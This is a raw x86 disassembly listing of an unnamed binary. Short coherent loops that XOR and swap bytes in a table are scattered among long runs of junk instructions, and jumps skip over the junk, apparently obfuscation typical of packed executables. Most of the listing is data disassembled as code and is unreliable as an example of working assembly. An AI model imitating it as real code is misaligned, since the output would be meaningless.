  404a86:	loopne 0x404a68
  404a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a89:	and    ebp,DWORD PTR [edx]
  404a8b:	and    DWORD PTR [ebx+0x15],ecx
  404a8e:	arpl   bp,bx
  404a90:	(bad)  
  404a91:	mov    dh,0x73
  404a93:	(bad)  
  404a95:	nop
  404a96:	fidiv  WORD PTR [ecx-0x7722c11d]
  404a9c:	push   0x95c98741
  404aa1:	repnz xchg ebx,eax
  404aa3:	loop   0x404ac9
  404aa5:	rol    edi,0x45
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xf63c6a28
  404b32:	add    ah,BYTE PTR [ecx+0x7e22a270]
  404b38:	jle    0x404b92
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b85
  404b3e:	loop   0x404b47
  404b40:	pop    ds
  404b41:	cld    
  404b42:	fdiv   QWORD PTR [ebx+0x131b7a87]
  404b48:	clc    
  404b49:	mov    ecx,DWORD PTR [edx+esi*8]
  404b4c:	fwait
  404b4d:	(bad)  
  404b4e:	cmc    
  404b4f:	sahf   
  404b50:	jge    0x404b47
  404b52:	ret    
  404b53:	loop   0x404b5d
  404b55:	neg    BYTE PTR [ebx+0xd]
  404b58:	xor    BYTE PTR [edi-0x71],cl
  404b5b:	neg    DWORD PTR [ecx+ebp*2-0x2f]
  404b5f:	cld    
  404b60:	inc    ebx
  404b61:	loope  0x404bd4
  404b63:	xor    bl,BYTE PTR [esp+ebx*2]
  404b66:	sub    ah,BYTE PTR [eax]
  404b68:	xchg   ebx,eax
  404b69:	xor    al,0xa8
  404b6b:	push   edi
  404b6c:	mov    WORD PTR [ecx+0x228ab245],?
  404b72:	scas   al,BYTE PTR es:[edi]
  404b73:	pop    ds
  404b74:	in     eax,dx
  404b75:	cdq    
  404b76:	test   DWORD PTR [edx+0x2911db3f],esi
  404b7c:	cdq    
  404b7d:	jo     0x404b4b
  404b7f:	into   
  404b80:	push   0x5
  404b82:	mov    esi,0x228174c3
  404b87:	cwde   
  404b88:	jecxz  0x404be6
  404b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b8b:	jo     0x404bfc
  404b8d:	lea    ebx,[ebx+0x77]
  404b90:	mov    dh,BYTE PTR [ebp-0x32]
  404b93:	mov    ah,0x4b
  404b95:	ret    
  404b96:	cdq    
  404b97:	lods   al,BYTE PTR ds:[esi]
  404b98:	rcr    eax,0xeb
  404b9b:	inc    ebx
  404b9c:	jmp    0x404b77
  404b9e:	cmp    BYTE PTR [ecx-0x5c],bh
  404ba1:	arpl   si,cx
  404ba3:	mov    ecx,esp
  404ba5:	(bad)  
  404ba6:	je     0x404b9b
  404ba8:	fstp   st(6)
  404baa:	xor    eax,0xcc0f34a4
  404baf:	shr    BYTE PTR [ebx-0x585ef060],0x46
  404bb6:	aas    
  404bb7:	call   0xfb25:0xfad77aa7
  404bbe:	jne    0x404b7c
  404bc0:	out    dx,eax
  404bc1:	dec    ecx
  404bc2:	add    al,0xb1
  404bc4:	sbb    al,0xe1
  404bc6:	sbb    bh,BYTE PTR [eax+0x3b5d532a]
  404bcc:	and    DWORD PTR [ebp+edx*2+0x2bcbfb01],ebx
  404bd3:	adc    eax,0x48714b37
  404bd8:	push   edx
  404bd9:	push   ebx
  404bda:	push   edi
  404bdb:	loope  0x404bbd
  404bdd:	ins    DWORD PTR es:[edi],dx
  404bde:	jbe    0x404bbc
  404be0:	cmp    BYTE PTR [ebx],al
  404be2:	mov    eax,ds:0xb321d5ff
  404be7:	rol    DWORD PTR [ecx-0x5f60a419],1
  404bed:	xchg   BYTE PTR ds:0xafd9d36d,ah
  404bf3:	imul   ebp,DWORD PTR [eax+0x46],0xc095eb94
  404bfa:	into   
  404bfb:	stc    
  404bfc:	ins    DWORD PTR es:[edi],dx
  404bfd:	jbe    0x404b9a
  404bff:	(bad)  
  404c00:	sti    
  404c01:	fisttp DWORD PTR [edx-0x1f3d9b39]
  404c07:	mov    bh,0xc0
  404c09:	and    edi,ebx
  404c0b:	mov    edi,0xac6edf38
  404c10:	inc    ebp
  404c11:	pcmpgtw mm0,QWORD PTR [esi]
  404c14:	arpl   bx,ax
  404c16:	jmp    0xdef2ef61
  404c1b:	fwait
  404c1c:	mov    BYTE PTR [edx+0x74],cl
  404c1f:	cli    
  404c20:	mov    WORD PTR [esi-0x75d6b91e],fs
  404c26:	pushf  
  404c27:	bndldx (bad),[esi+0x2ba9c5a]
  404c2e:	sbb    ch,dl
  404c30:	jno    0x404bfd
  404c32:	loop   0x404c6b
  404c34:	and    ebx,edi
  404c36:	pop    ecx
  404c37:	dec    esp
  404c38:	jne    0x404c12
  404c3a:	cmp    eax,0x3f6b58ea
  404c3f:	xor    DWORD PTR [esi+0x60],eax
  404c42:	sbb    DWORD PTR [ebp+eiz*8-0x6173db8b],ebp
  404c49:	ins    DWORD PTR es:[edi],dx
  404c4a:	aam    0x65
  404c4c:	add    DWORD PTR [esp+ebp*1-0x3c],ebp
  404c50:	rol    BYTE PTR [eax+0x78],cl
  404c53:	cvtpi2ps xmm0,QWORD PTR [edx]
  404c56:	lahf   
  404c57:	push   ebx
  404c58:	mov    DWORD PTR [eax],edi
  404c5a:	cld    
  404c5b:	das    
  404c5c:	cmp    al,0x26
  404c5e:	std    
  404c5f:	xchg   edx,eax
  404c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c61:	add    DWORD PTR [eax],edi
  404c63:	in     al,dx
  404c64:	pop    edi
  404c65:	cmp    eax,0x9a333288
  404c6a:	mov    DWORD PTR [edx+0x294ed588],ebp
  404c70:	adc    al,0xa8
  404c72:	jb     0x404c6b
  404c74:	xor    eax,0xa0cf084b
  404c79:	retf   
  404c7a:	push   cs
  404c7b:	test   al,0xc
  404c7d:	in     al,dx
  404c7e:	jns    0x404cad
  404c80:	inc    esp
  404c81:	fsubr  DWORD PTR [ecx]
  404c83:	shl    BYTE PTR [ebp-0x2568c43],0xee
  404c8a:	inc    ebp
  404c8b:	aad    0xbd
  404c8d:	xlat   BYTE PTR ds:[ebx]
  404c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c8f:	cld    
  404c90:	loope  0x404d03
  404c92:	test   eax,0xde2ff787
  404c97:	lds    esi,FWORD PTR [edi+0x4f]
  404c9a:	sahf   
  404c9b:	adc    DWORD PTR [eax-0x4b550c04],0xffffffab
  404ca2:	mov    bh,0xb9
  404ca4:	movups XMMWORD PTR [edi],xmm7
  404ca7:	popa   
  404ca8:	adc    eax,0x87933da6
  404cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cae:	add    eax,0x8acc0179
  404cb3:	and    cl,ah
  404cb5:	lock (bad) 
  404cb7:	dec    edi
  404cb8:	sub    DWORD PTR [eax+0xb12378a],ecx
  404cbe:	jno    0x404c5e
  404cc0:	push   es
  404cc1:	xchg   ecx,eax
  404cc2:	adc    bh,cl
  404cc4:	int3   
  404cc5:	enter  0x17dc,0x92
  404cc9:	push   ss
  404cca:	mov    ebp,0x22304a3
  404ccf:	dec    ebp
  404cd0:	pop    eax
  404cd1:	out    0x4c,eax
  404cd3:	imul   esp,ecx,0x7d27c3a4
  404cd9:	mov    dh,BYTE PTR [edx-0x689e489f]
  404cdf:	inc    BYTE PTR [edi-0x7c9b63a1]
  404ce5:	and    DWORD PTR [edi+0x5d],edx
  404ce8:	bound  ebp,QWORD PTR [edi]
  404cea:	mov    dl,bl
  404cec:	xchg   edi,eax
  404ced:	cmp    eax,0xb85c20d5
  404cf2:	lock dec edi
  404cf4:	mov    ebx,ebp
  404cf6:	ds dec esi
  404cf8:	(bad)  
  404cf9:	out    0xfb,eax
  404cfb:	ss dec ebp
  404cfd:	jecxz  0x404d6f
  404cff:	add    ecx,DWORD PTR [edi+0x32]
  404d02:	icebp  
  404d03:	sbb    al,0xe5
  404d05:	mov    ah,0xfc
  404d07:	in     eax,dx
  404d08:	das    
  404d09:	inc    esi
  404d0a:	mov    dh,0x2c
  404d0c:	or     DWORD PTR [edi],ebp
  404d0e:	outs   dx,BYTE PTR ds:[esi]
  404d0f:	mov    bh,0x56
  404d11:	loope  0x404d0b
  404d13:	jns    0x404ccc
  404d15:	int3   
  404d16:	jne    0x404cec
  404d18:	clc    
  404d19:	jge    0x404cef
  404d1b:	jl     0x404d8a
  404d1d:	fwait
  404d1e:	or     BYTE PTR ds:[edi-0x63],bl
  404d22:	jae    0x404cf3
  404d24:	aaa    
  404d25:	inc    eax
  404d26:	leave  
  404d27:	(bad)  
  404d28:	jl     0x404cb7
  404d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d2b:	ins    DWORD PTR es:[edi],dx
  404d2c:	outs   dx,DWORD PTR ds:[esi]
  404d2d:	popa   
  404d2e:	adc    eax,0x8930aa8b
  404d33:	mul    BYTE PTR [esi+0x45]
  404d36:	daa    
  404d37:	popf   
  404d38:	pop    ds
  404d39:	add    ah,cl
  404d3b:	jnp    0x404d1e
  404d3d:	sbb    dl,BYTE PTR [edx-0xa]
  404d40:	pop    esi
  404d41:	mov    cl,0x57
  404d43:	(bad)  
  404d44:	mov    ds:0x5d1c32e3,al
  404d49:	mov    edx,0xb57281c9
  404d4e:	jmp    0x45f08a5a
  404d53:	add    BYTE PTR [ecx+edx*4+0x65],dl
  404d57:	pop    eax
  404d58:	inc    edx
  404d59:	sbb    al,0x95
  404d5b:	and    al,0x79
  404d5d:	rol    DWORD PTR [esi+0x32d5a89b],1
  404d63:	adc    al,0xe5
  404d65:	(bad)
  404d69:	cmp    ebp,ecx
  404d6b:	adc    BYTE PTR [edi+eiz*1-0x284ff02d],bh
  404d72:	bound  edx,QWORD PTR [esi-0x41ed1db9]
  404d78:	pop    esi
  404d79:	loope  0x404d69
  404d7b:	mov    esi,0x736b08e6
  404d80:	(bad)  
  404d81:	fstp   DWORD PTR [ecx]
  404d83:	mov    WORD PTR [edi-0x367157c],?
  404d89:	sub    ch,BYTE PTR [edx-0x51]
  404d8c:	mov    dh,0xe9
  404d8e:	lock dec ecx
  404d90:	adc    DWORD PTR [ebp-0x9e87f99],edi
  404d96:	out    dx,eax
  404d97:	into   
  404d98:	clc    
  404d99:	mov    edx,0xf10eff43
  404d9e:	jae    0x404dc0
  404da0:	mov    edx,0x31f58e44
  404da5:	ret    0xa17b
  404da8:	in     al,0x81
  404daa:	shl    edx,0xc5
  404dad:	cmp    al,0x3c
  404daf:	fild   QWORD PTR [esi-0x66]
  404db2:	inc    edi
  404db3:	icebp  
  404db4:	cli    
  404db5:	movntps XMMWORD PTR [ebx-0x126b89a9],xmm3
  404dbc:	push   0x30
  404dbe:	fsincos 
  404dc0:	fadd   DWORD PTR [esi+0x34bdc750]
  404dc6:	fimul  DWORD PTR ds:0x8041504b
  404dcc:	cmp    eax,0xf417c6d2
  404dd1:	xchg   edi,eax
  404dd2:	jp     0x404e09
  404dd4:	sub    ah,al
  404dd6:	dec    eax
  404dd7:	inc    esi
  404dd8:	popf   
  404dd9:	out    dx,al
  404dda:	test   DWORD PTR [ebx-0x2b],ebx
  404ddd:	xchg   BYTE PTR [ebp-0x4c90ce0a],ch
  404de3:	jno    0x404e3c
  404de5:	cmp    dh,BYTE PTR [edi-0x33a186cf]
  404deb:	sub    DWORD PTR [ebp-0x4688ad5a],eax
  404df1:	add    DWORD PTR [eax+0x7f12a3d7],ebx
  404df7:	rcl    al,cl
  404df9:	imul   ebp,DWORD PTR [eax-0x21],0xe466c8d8
  404e00:	int    0x95
  404e02:	out    0xab,al
  404e04:	jge    0x404e03
  404e06:	xor    ebp,0x6a
  404e09:	pop    edi
  404e0a:	or     al,dh
  404e0c:	cld    
  404e0d:	sub    eax,DWORD PTR [ecx+0x645adee6]
  404e13:	sbb    al,ch
  404e15:	xchg   esp,eax
  404e16:	pop    ecx
  404e17:	sub    al,BYTE PTR [ebx]
  404e19:	pushf  
  404e1a:	jne    0x404e94
  404e1c:	jmp    0x404e82
  404e1e:	mov    ebp,0x2ca7c5e3
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e93
  404e5e:	or     DWORD PTR [esi-0x3],esp
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e66
  404e6a:	mov    ebp,DWORD PTR [edx+0x71]
  404e6d:	pop    ss
  404e6e:	sub    al,BYTE PTR [ecx]
  404e70:	mov    al,BYTE PTR [ecx]
  404e72:	cmp    BYTE PTR [ebx+0x2bcc651d],ah
  404e78:	jle    0x404dfb
  404e7a:	int3   
  404e7b:	(bad)
  404e7e:	int3   
  404e7f:	push   esi
  404e80:	int3   
  404e81:	pop    ebp
  404e82:	out    dx,eax
  404e83:	in     eax,dx
  404e84:	fisubr WORD PTR [ecx-0x37]
  404e87:	data16 aaa 
  404e89:	adc    eax,0x3151026c
  404e8e:	dec    esp
  404e8f:	fisubr DWORD PTR [ebp+0x7200b8f2]
  404e95:	add    dh,BYTE PTR [ebx+0x6f]
  404e98:	mov    DWORD PTR [edx+0x2e29d466],edi
  404e9e:	pop    ss
  404e9f:	push   es
  404ea0:	ins    BYTE PTR es:[edi],dx
  404ea1:	mov    ebp,0xae18f2a0
  404ea6:	fsubrp st(3),st
  404ea8:	inc    esp
  404ea9:	les    esi,FWORD PTR [ebp+esi*1-0x526e3e21]
  404eb0:	(bad)  
  404eb1:	push   0x163f9c33
  404eb6:	ja     0x404ebe
  404eb8:	outs   dx,DWORD PTR ds:[esi]
  404eb9:	add    BYTE PTR [ebx+ecx*1],bh
  404ebc:	sub    DWORD PTR [ebx-0x23],0x6f27965f
  404ec3:	test   al,0x25
  404ec5:	inc    edx
  404ec6:	adc    ebp,DWORD PTR [edi]
  404ec8:	inc    eax
  404ec9:	inc    edx
  404eca:	mov    eax,ds:0xd7d77e91
  404ecf:	arpl   WORD PTR [edi],bp
  404ed1:	add    BYTE PTR [edx+0x1e],ah
  404ed4:	adc    ch,dl
  404ed6:	push   eax
  404ed7:	shl    BYTE PTR [ebx],0x3a
  404eda:	sub    eax,0x62d69576
  404edf:	in     eax,dx
  404ee0:	ret    0xfa6a
  404ee3:	sahf   
  404ee4:	fistp  WORD PTR [eax+0x67a73c07]
  404eea:	mov    DWORD PTR [edi+0x1f],eax
  404eed:	inc    eax
  404eee:	and    DWORD PTR [edi],eax
  404ef0:	sub    al,0x3e
  404ef2:	(bad)  
  404ef3:	rol    BYTE PTR [esi-0x3e],cl
  404ef6:	sub    BYTE PTR [ebx+0x14a512d3],dh
  404efc:	or     al,0xe3
  404efe:	pop    eax
  404eff:	mov    dh,0x1e
  404f01:	adc    al,0xc3
  404f03:	push   DWORD PTR [esi]
  404f05:	pop    ebx
  404f06:	(bad)  
  404f07:	cwde   
  404f08:	(bad)  
  404f09:	ss and bh,ah
  404f0c:	mov    bl,0x2c
  404f0e:	adc    esp,DWORD PTR [ebp+0x5c15877e]
  404f14:	fucom  st(7)
  404f16:	out    0x31,eax
  404f18:	mov    bh,0x96
  404f1a:	adc    BYTE PTR [edx-0x4a134ddb],al
  404f20:	loop   0x404f4d
  404f22:	mov    ebx,DWORD PTR [ebp-0x58]
  404f25:	mov    ebp,0xd30677be
  404f2a:	pop    edi
  404f2c:	fwait
  404f2d:	push   esi
  404f2e:	(bad)  
  404f2f:	sub    DWORD PTR es:[edx-0x7e],ebx
  404f33:	rcl    BYTE PTR [eax],0xa7
  404f36:	clc    
  404f37:	ins    BYTE PTR es:[edi],dx
  404f38:	fist   DWORD PTR [ecx+0x0]
  404f3b:	call   0x9b844914
  404f40:	stos   BYTE PTR es:[edi],al
  404f41:	sub    al,0xda
  404f43:	push   ecx
  404f44:	pop    edx
  404f45:	shl    ecx,1
  404f47:	jb     0x404f9c
  404f49:	mov    ch,0xf0
  404f4b:	mov    ds:0x3428a775,eax
  404f50:	dec    ecx
  404f51:	cdq    
  404f52:	aas    
  404f53:	fdiv   QWORD PTR [edx-0x37c0765b]
  404f59:	push   ds
  404f5a:	int3   
  404f5b:	lds    ecx,FWORD PTR [ebx-0x43]
  404f5e:	adc    BYTE PTR ds:0xd09adbfa,al
  404f64:	push   0xb0d9044e
  404f69:	mov    ch,0x97
  404f6b:	add    al,0x4b
  404f6d:	inc    ebp
  404f6e:	fsub   st,st(2)
  404f70:	popf   
  404f71:	les    ebx,FWORD PTR [esi]
  404f73:	inc    esp
  404f74:	fscale 
  404f76:	shl    BYTE PTR [esi-0x2fa7bc0],1
  404f7c:	out    0x5e,eax
  404f7e:	ds stos BYTE PTR es:[edi],al
  404f80:	lods   eax,DWORD PTR ds:[esi]
  404f81:	loopne 0x404f04
  404f83:	inc    esi
  404f84:	dec    edi
  404f85:	repnz fiadd WORD PTR gs:[esi]
  404f89:	jmp    0x2f7a:0x1396aa68
  404f90:	pop    ss
  404f91:	sahf   
  404f92:	adc    DWORD PTR [eax],esp
  404f94:	iret   
  404f95:	rcr    DWORD PTR [eax],cl
  404f97:	leave  
  404f98:	arpl   WORD PTR [ebx],bp
  404f9a:	xchg   ebx,eax
  404f9b:	mov    edx,ecx
  404f9d:	js     0x405010
  404f9f:	data16 in al,0xab
  404fa2:	je     0x404f87
  404fa4:	test   edx,ebp
  404fa6:	outs   dx,BYTE PTR ds:[esi]
  404fa7:	sti    
  404fa8:	cld    
  404fa9:	in     eax,dx
  404faa:	add    eax,0x640c49f6
  404faf:	not    DWORD PTR [esi+0x5c62c9af]
  404fb5:	clc    
  404fb6:	push   0xa37f5517
  404fbb:	dec    ebp
  404fbc:	mov    eax,ds:0x14d81eb3
  404fc1:	test   al,0x39
  404fc3:	test   BYTE PTR [ecx+0x685f6b5e],cl
  404fc9:	push   cs
  404fca:	(bad)
  404fcd:	and    edx,DWORD PTR [ecx+edx*8+0x21edb397]
  404fd4:	mov    esp,0x586c61c4
  404fd9:	or     ebx,DWORD PTR [esp+ebx*1]
  404fdc:	test   bl,cl
  404fde:	mov    ds:0xe4805792,eax
  404fe3:	repz fwait
  404fe5:	pop    edx
  404fe6:	aaa    
  404fe7:	cmp    dh,BYTE PTR [ebx]
  404fe9:	pushf  
  404fea:	dec    ecx
  404feb:	xchg   esp,eax
  404fec:	jge    0x404fea
  404fee:	jmp    0x949:0xd0c241
  404ff5:	scas   eax,DWORD PTR es:[edi]
  404ff6:	div    BYTE PTR [ecx+esi*2+0x6cbb9842]
  404ffd:	jmp    0x404fb6
  404fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405000:	adc    ebx,ecx
  405002:	ds cs fwait
  405005:	pop    ss
  405006:	es jb  0x405037
  405009:	loopne 0x40505c
  40500b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40500c:	outs   dx,DWORD PTR ds:[esi]
  40500d:	(bad)  
  40500e:	push   ss
  40500f:	push   edx
  405010:	pushf  
  405011:	pop    edi
  405012:	push   ecx
  405013:	dec    esi
  405014:	in     al,dx
  405015:	int    0x8f
  405017:	data16 js 0x404fd4
  40501a:	mov    ?,WORD PTR [edx+ecx*4+0x6c]
  40501e:	add    ebx,edi
  405020:	inc    ebp
  405021:	repz push cs
  405023:	mov    edi,0xdf4d85fa
  405028:	pop    edx
  405029:	daa    
  40502a:	push   es
  40502b:	test   bh,al
  40502d:	mov    al,0xc0
  40502f:	push   ecx
  405030:	push   0x35
  405032:	cs mov ebp,0xeb151444
  405038:	jl     0x405005
  40503a:	test   edx,ebx
  40503c:	pop    eax
  40503d:	push   edx
  40503e:	jg     0x405063
  405040:	jmp    0x4050ae
  405042:	mov    esi,0xb4d3fd0c
  405047:	mov    ebp,0xbd2c3c97
  40504c:	jmp    0x86d3:0x8933a80a
  405053:	xchg   ebx,eax
  405054:	bswap  ecx
  405056:	imul   edi,DWORD PTR [ebx+0x13d1bb4d],0x68ff73e8
  405060:	sbb    eax,ebx
  405062:	mov    ds:0xa72da0d8,eax
  405067:	sub    esp,DWORD PTR [edi]
  405069:	ins    DWORD PTR es:[edi],dx
  40506a:	add    DWORD PTR ds:0x846f39f3,0xffffffcc
  405071:	idiv   DWORD PTR [ebp+esi*4-0x33758e8]
  405078:	xor    bl,ah
  40507a:	dec    edx
  40507b:	pushf  
  40507c:	fbstp  TBYTE PTR [ecx]
  40507e:	sahf   
  40507f:	and    al,0xe4
  405081:	in     al,0xb3
  405083:	mov    edi,ecx
  405085:	pop    ebp
  405086:	jbe    0x4050a0
  405088:	or     al,0x5e
  40508a:	mov    cr5,ecx
  40508d:	push   edi
  40508e:	mov    edx,0x2999557b
  405093:	inc    ecx
  405094:	and    eax,0xaabde03
  405099:	mov    bl,0xe5
  40509b:	lahf   
  40509c:	cmp    eax,0x6a8d6669
  4050a1:	or     al,0xc1
  4050a3:	aaa    
  4050a4:	scas   al,BYTE PTR es:[edi]
  4050a5:	jle    0x405086
  4050a7:	sbb    dh,BYTE PTR [edx+0xa45c3b1]
  4050ad:	loop   0x4050e0
  4050af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050b0:	xchg   ecx,eax
  4050b1:	xchg   ebx,eax
  4050b2:	add    BYTE PTR [esi+0x55e54201],dh
  4050b8:	push   edi
  4050b9:	shld   ebx,ebx,0xfc
  4050bd:	and    BYTE PTR [eax+0x1],ch
  4050c0:	cmp    DWORD PTR [esi+ecx*4-0x8],ebp
  4050c4:	and    esi,DWORD PTR [edx+0x53]
  4050c7:	retf   
  4050c8:	pop    ecx
  4050c9:	in     al,dx
  4050ca:	jmp    0xc9978376
  4050cf:	xchg   ebx,eax
  4050d0:	push   edx
  4050d1:	cld    
  4050d2:	jle    0x405123
  4050d4:	sub    BYTE PTR ds:0x1fd2ad77,ch
  4050da:	test   DWORD PTR [ebx-0xe],esi
  4050dd:	loopne 0x405078
  4050df:	sub    edi,DWORD PTR [edi+edi*4+0x70c925a2]
  4050e6:	retf   
  4050e7:	mov    ch,0x66
  4050e9:	mov    eax,0x3bef33a6
  4050ee:	xor    edi,DWORD PTR [eax]
  4050f0:	fimul  DWORD PTR [ebx+0x24]
  4050f3:	jno    0x405125
  4050f5:	cli    
  4050f6:	adc    BYTE PTR [edi+0x3e3111ce],0x4a
  4050fd:	and    al,0x6d
  4050ff:	dec    ecx
  405100:	in     al,dx
  405101:	nop
  405102:	dec    ebp
  405103:	pushf  
  405104:	add    al,0xa9
  405106:	adc    DWORD PTR [edi],esi
  405108:	fld    TBYTE PTR [esi-0x2e]
  40510b:	push   ss
  40510c:	call   0x2fdde6b5
  405111:	dec    esp
  405112:	out    0x62,al
  405114:	jmp    0x40514a
  405116:	push   edx
  405117:	les    ebp,FWORD PTR [esi+0x67525b5c]
  40511d:	and    dl,dl
  40511f:	cld    
  405120:	sbb    eax,0x4bf9eb69
  405125:	xchg   edx,eax
  405126:	test   al,0x71
  405128:	pop    edx
  405129:	pushf  
  40512a:	mov    bl,0x29
  40512c:	sti    
  40512d:	jle    0x4050df
  40512f:	data16 mov ah,0x37
  405132:	mov    cl,0xae
  405134:	pop    esi
  405135:	popf   
  405136:	jmp    0x69a8:0xecf6142a
  40513d:	in     al,0x38
  40513f:	pop    esi
  405140:	ja     0x4050e9
  405142:	dec    ebp
  405143:	xchg   ebp,ebx
  405145:	into   
  405146:	leave  
  405147:	in     al,0xbb
  405149:	pop    edx
  40514a:	nop
  40514b:	sbb    al,0x14
  40514d:	xor    eax,DWORD PTR [ebp-0x740450f1]
  405153:	pop    ebp
  405154:	call   0xd16c298c
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	or     esi,edx
  405173:	in     eax,dx
  405174:	shl    esi,1
  405176:	sub    al,0x7e
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051a5
  40517e:	ins    BYTE PTR es:[edi],dx
  40517f:	jbe    0x405165
  405181:	mov    bh,0xb6
  405183:	(bad)  
  405184:	dec    eax
  405185:	pop    ecx
  405186:	dec    eax
  405187:	add    bh,BYTE PTR ds:0x6f7acf50
  40518d:	int    0x23
  40518f:	lea    esi,ds:0x97484af5
  405195:	push   ebp
  405196:	pop    eax
  405197:	mov    eax,ds:0x983350ea
  40519c:	out    dx,eax
  40519d:	in     eax,0x49
  40519f:	adc    ecx,edx
  4051a1:	pop    ds
  4051a2:	sti    
  4051a3:	mov    ebx,0x241fc78e
  4051a8:	sub    eax,0x24cd8e17
  4051ad:	sbb    BYTE PTR [ebx+0x1d453a85],ch
  4051b3:	iret   
  4051b4:	mov    ebp,0x1b1add36
  4051b9:	das    
  4051ba:	sbb    eax,0x6f
  4051bd:	sti    
  4051be:	cdq    
  4051bf:	mov    eax,0xd7b338c
  4051c4:	cs in  al,0xec
  4051c7:	scas   eax,DWORD PTR es:[edi]
  4051c8:	test   DWORD PTR [edx],ecx
  4051ca:	outs   dx,DWORD PTR ds:[esi]
  4051cc:	and    eax,0x4178c9ce
  4051d1:	sbb    edx,0xb85b62b3
  4051d7:	sub    DWORD PTR [edx*4-0x310b9b21],0x71711528
  4051e2:	xor    esi,0x8078520
  4051e8:	outs   dx,BYTE PTR ds:[esi]
  4051e9:	aas    
  4051ea:	push   edi
  4051eb:	ror    DWORD PTR [edx],cl
  4051ed:	jmp    0xe8ca:0xb347eca
  4051f4:	sub    eax,0x5309bfb1
  4051f9:	jecxz  0x4051f7
  4051fb:	leave  
  4051fc:	popf   
  4051fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051fe:	dec    ebp
  4051ff:	pushf  
  405200:	jg     0x40526f
  405202:	scas   al,BYTE PTR es:[edi]
  405203:	jbe    0x40523d
  405205:	cmp    ah,BYTE PTR [ecx+ebp*8+0x78]
  405209:	or     al,0xbc
  40520b:	pop    es
  40520c:	pop    es
  40520d:	xchg   BYTE PTR [esi],bl
  40520f:	push   esi
  405210:	dec    eax
  405211:	cld    
  405212:	adc    ebp,edx
  405214:	cwde   
  405215:	xchg   ecx,eax
  405216:	inc    ecx
  405217:	mov    ecx,0xa672225b
  40521c:	or     DWORD PTR [ebx+edi*2-0x800b73],eax
  405223:	sub    eax,0xf32483a6
  405228:	jb     0x40527c
  40522a:	cmp    al,0x20
  40522c:	push   cs
  40522d:	dec    esi
  40522e:	add    eax,0x20ab1d3d
  405233:	imul   eax,DWORD PTR [ecx-0x62],0x5b
  405237:	sub    ebx,DWORD PTR ds:0x67b590b7
  40523d:	pop    edx
  40523e:	cmp    bh,0x35
  405241:	aad    0x3a
  405243:	(bad)  
  405244:	popf   
  405245:	jmp    0x6667:0x2231ff55
  40524c:	(bad)  
  40524d:	jg     0x405287
  40524f:	outs   dx,BYTE PTR ds:[esi]
  405250:	test   eax,0x23e576b1
  405255:	lds    ebx,FWORD PTR [ecx+esi*4+0x4c]
